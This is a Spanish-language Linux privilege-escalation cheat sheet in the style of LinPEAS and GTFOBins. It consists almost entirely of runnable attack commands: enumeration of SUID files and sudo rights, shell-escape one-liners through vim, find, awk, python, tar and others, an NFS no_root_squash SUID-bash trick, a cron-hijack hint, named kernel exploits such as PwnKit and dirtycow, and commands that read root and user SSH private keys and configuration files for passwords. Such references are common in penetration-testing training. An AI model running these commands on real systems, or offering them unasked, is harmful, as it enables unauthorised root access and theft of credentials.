# Guía rápida de escalada de privilegios en Linux

## Script de enumeración rápida

```bash
# Enumeración estilo LinPEAS
# 1. Verificar el usuario actual y sus permisos
id; whoami; sudo -l

# 2. Verificar archivos SUID
find / -perm -4000 2>/dev/null

# 3. Verificar los comandos disponibles con sudo
sudo -l

# 4. Verificar crontab
cat /etc/crontab
ls -la /etc/cron.d/

# 5. Verificar la red
netstat -tulpn
ss -tulpn

# 6. Verificar servicios
ps aux | grep root
systemctl list-units --type=service

# 7. Verificar directorios con permiso de escritura
find / -writable -type d 2>/dev/null | grep -v proc

# 8. Verificar la versión del kernel
uname -a
cat /etc/issue

# 9. Verificar la versión de sudo (CVE)
sudo --version

# 10. Verificar la versión de polkit
pkexec --version
```

## Rutas comunes de escalada de privilegios

### 1. Escalada mediante SUID

```bash
# Binarios SUID comúnmente explotables
nmap:        nmap --interactive; !sh
vim:         vim -c ':!/bin/sh'
less:        less /etc/passwd; !/bin/sh
more:        more /etc/passwd; !/bin/sh
awk:         awk 'BEGIN {system("/bin/sh")}'
find:        find . -exec /bin/sh -p \; -quit
python:      python -c 'import os; os.system("/bin/sh")'
perl:        perl -e 'exec "/bin/sh";'
ruby:        ruby -e 'exec "/bin/sh"'
bash:        bash -p
sh:          sh
```

### 2. Escalada mediante Sudo

```bash
# sudo -l muestra los comandos disponibles
# Comandos comúnmente usados para escalar privilegios
sudo git help config; !/bin/sh
sudo less /etc/passwd; !/bin/sh
sudo vim; :!/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find . -exec /bin/sh -p \; -quit
sudo python -c 'import os; os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh"'
sudo ruby -e 'exec "/bin/sh"'
sudo lua -e 'os.execute("/bin/sh")'
```

### 3. Escalada mediante Cron

```bash
# Verificar tareas de cron
cat /etc/crontab
ls -la /etc/cron.d/
# Si una tarea de cron se ejecuta con permisos de root y es escribible
# modificar el script para añadir comandos maliciosos
```

### 4. Escalada mediante NFS

```bash
# Si /home tiene no_root_squash
# montar desde otra máquina
mount -t nfs target:/home /tmp/nfs
cp /bin/bash /tmp/nfs/bash_suid
chmod +s /tmp/nfs/bash_suid
# ejecutar /tmp/nfs/bash_suid -p en la máquina objetivo
```

### 5. Vulnerabilidades del kernel

```python
# Buscar exploits disponibles
# Vulnerabilidades comunes:
# - dirtycow (CVE-2016-5195)
# - docker breakout (escape de contenedor Docker)
# - overlayfs (CVE-2021-3493)
# - Polkit (CVE-2021-4034) / PwnKit
# - etc.
```

### 6. Reutilización de contraseñas

```bash
# Verificar archivos de configuración legibles
cat /etc/mysql/my.cnf
cat /var/www/html/config.php
cat /home/*/.ssh/id_rsa
cat /root/.ssh/id_rsa
# Si se encuentra una contraseña, probar su root o ssh root@localhost
```

## Ubicaciones de archivos sensibles

```
/etc/passwd          # Puede ser escribible en algunos sistemas
/etc/shadow          # Normalmente no es legible
/root/.ssh/          # Clave SSH privada de root
/home/*/.ssh/       # Clave SSH privada del usuario
/var/www/html/       # Directorio web (puede contener configuración)
/tmp/                # Directorio escribible (para colocar el payload)
/etc/cron.d/         # Configuración de cron
/proc/self/environ   # Variables de entorno (pueden contener información sensible)
/proc/self/fd/       # Descriptores de archivo (pueden filtrar información)
```

## GTFOBins (tabla de referencia sudo/suid)

| Comando | Método de escalada |
|------|---------|
| `nmap` | `nmap --interactive` → `!sh` |
| `vim` | `:!/bin/sh` |
| `less` | `!/bin/sh` |
| `more` | `!/bin/sh` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `perl` | `perl -e 'exec "/bin/sh"'` |
| `python` | `python -c 'import os; os.system("/bin/sh")'` |
| `ruby` | `ruby -e 'exec "/bin/sh"'` |
| `git` | `git help config` → `!/bin/sh` |
| `tar` | `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `zip` | `zip /tmp/test.zip /tmp/test -T -TT 'sh #'` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
